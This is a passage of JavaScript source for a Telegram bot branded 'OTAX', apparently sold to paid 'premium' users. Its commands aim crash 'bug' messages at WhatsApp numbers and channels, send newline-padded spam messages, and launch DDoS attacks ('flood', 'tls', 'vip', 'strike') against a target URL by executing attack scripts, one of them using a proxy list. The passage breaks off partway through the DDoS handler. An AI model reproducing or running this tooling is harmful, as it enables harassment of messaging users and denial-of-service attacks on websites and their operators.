Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Ch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
 
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
const channelLink = match[1]?.trim();
  if (!channelLink) {
    return bot.sendMessage(
      chatId,
      "­ЪџФ Masukin link grup yang bener!\nContoh: /O-Ch https://whatsapp.com/channel/xxxx"
    );
  }

  if (!/^https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+$/.test(channelLink)) {
    return bot.sendMessage(
      chatId,
      "­ЪџФ Link channel salah!\nContoh: /O-Ch https://whatsapp.com/channel/xxxx"
    );
  }

  const channelCode = channelLink.split("https://whatsapp.com/channel/")[1];

  try {
    const link = channelLink;
    await bot.sendMessage(chatId, "РЈ│ Sedang Mengirim Pesan Ke Channel Whatsapp");     
    const channelJid = await getWhatsAppChannelInfo(link);
    const Jid = `${channelJid}@s.whatsapp.net`;
    const target = Jid;
    const mention = Jid;
    const isTarget = Jid;
 
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  


  
   const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${channelLink}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: 'Markdown'
  });
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${channelLink}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${channelLink}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${channelLink}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) {   
     
      }
  console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${channelLink}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${channelLink}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${channelLink}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Crash (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

  
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) {   
     
  }
 console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/^\/O-Clear\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; 
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await otax.sendMessage(target, { 
                text: "­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ ­ЮўЙ­ЮЎЄ­ЮЎђ­Юў╝­ЮЎЇ ­Юўй­ЮЎљ­ЮЎѓ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n­ЮЎі­ЮЎЕ­ЮЎќ­ЮЎЊ­ЮЎГ­ЮЎГ ­Юљѓ­ЮљІ­Юљё­Юљђ­ЮљЉ ­ЮљЂ­Юљћ­Юљє"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Otax!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

// ddos case OTAX
let attackProcesses = {};

async function handleAttackCommand(chatId, args) {
    if (args.length < 3) {
       bot.sendMessage(chatId, `Contoh: /O-Attack <target> <duration> <methods>\nattack https://google.com 120 flood`);  
        return; 
    }

    const [target, duration, methods] = args;

    try {
        const parsing = new URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`); 
         const result = scrape.data;

        console.clear(); 

        const metode = path.join(__dirname, `/otaxddos/${methods}`);

        function pushOngoing (target, methods, duration){
            console.log(`${target} ${methods} ${duration}`)
        }
        let process;

        if (methods === 'flood') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration} 100 10`);
            bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­ЮўД­ЮўГ­Юў░­Юў░­ЮўЦ
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});      
} else if (methods === 'tls') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration} 100 10`);
            bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юўх­ЮўГ­Юў┤
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
} else if (methods === 'vip') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration}`);
           bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юўи­Юўф­Юў▒
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
 } else if (methods === 'strike') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`);
